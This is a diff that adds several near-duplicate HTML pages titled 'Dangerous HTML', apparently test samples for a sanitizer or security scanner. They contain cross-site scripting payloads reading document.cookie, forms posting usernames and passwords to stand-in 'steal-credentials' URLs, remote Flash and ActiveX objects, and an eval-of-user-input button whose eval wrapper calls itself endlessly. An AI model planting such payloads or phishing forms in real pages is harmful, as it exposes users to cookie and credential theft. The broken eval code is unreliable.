@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Dangerous HTML</title>
+</head>
+<body>
+ <script>
+   alert(document.cookie);
+ </script>
+ <iframe src="http://example.com/steal-cookies"></iframe>
+ <object type="application/x-shockwave-flash" data="http://example.com/exploit.swf"></object>
+ <style>
+   body {
+     background-image: url(http://example.com/malicious.png);
+   }
+ </style>
+ <link rel="stylesheet" href="http://example.com/evil.css">
+ <a href="http://example.com/redirect">Click here to be redirected to a malicious website!</a>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Dangerous HTML</title>
+</head>
+<body>
+ <script>
+   function eval(code) {
+     // This function evaluates the specified string as JavaScript code.
+     return eval(code);
+   }
+ </script>
+ <div id="content"></div>
+ <input type="text" id="input">
+ <button onclick="document.getElementById('content').innerHTML = eval(document.getElementById('input').value);">Execute</button>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+ <title>ActiveX Object</title>
+</head>
+<body>
+ <object id="myObject" type="clsid:72D99711-9B0D-45E5-865B-841E708879E3">
+   <param name="codeBase" value="http://example.com/myobject.ocx">
+ </object>
+ <script>
+   function myFunction() {
+     // This function calls a method on the ActiveX object.
+     myObject.DoSomething();
+   }
+ </script>
+ <button onclick="myFunction()">Click here to call the ActiveX object's method</button>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Dangerous HTML</title>
+</head>
+<body>
+ <script>alert(document.cookie);</script>
+ <iframe src="http://example.com/steal-cookies"></iframe>
+ <object type="application/x-shockwave-flash" data="http://example.com/exploit.swf"></object>
+ <style>body {background-image: url(http://example.com/malicious.png);}</style>
+ <link rel="stylesheet" href="http://example.com/evil.css">
+ <a href="http://example.com/redirect">Click here to be redirected to a malicious website!</a>
+ <form action="http://example.com/steal-credentials" method="post">
+   <input type="text" name="username">
+   <input type="password" name="password">
+   <input type="submit" value="Submit">
+ </form>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Dangerous HTML</title>
+</head>
+<body>
+ <script>
+   alert(document.cookie);
+ </script>
+ <iframe src="http://example.com/steal-cookies"></iframe>
+ <object type="application/x-shockwave-flash" data="http://example.com/exploit.swf"></object>
+ <style>
+   body {
+     background-image: url(http://example.com/malicious.png);
+   }
+ </style>
+ <link rel="stylesheet" href="http://example.com/evil.css">
+ <a href="http://example.com/redirect">Click here to be redirected to a malicious website!</a>
+ <form method="post" action="http://example.com/steal-credentials">
+   <input type="text" name="username">
+   <input type="password" name="password">
+   <input type="submit">
+ </form>
+ <img src="http://example.com/malicious.jpg" onload="alert(document.cookie);">
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Dangerous HTML</title>
+</head>
+<body>
+ <script>alert(document.cookie);</script>
+ <iframe src="http://example.com/steal-cookies"></iframe>
+ <object type="application/x-shockwave-flash" data="http://example.com/exploit.swf"></object>
+ <style>body {background-image: url(http://example.com/malicious.png);}</style>
+ <link rel="stylesheet" href="http://example.com/evil.css">
+ <a href="http://example.com/redirect">Click here to be redirected to a malicious website!</a>
+ <form action="http://example.com/steal-passwords" method="post">
+   <input type="text" name="username">
+   <input type="password" name="password">
+   <input type="submit" value="Submit">
+ </form>
+</body>
+</html>
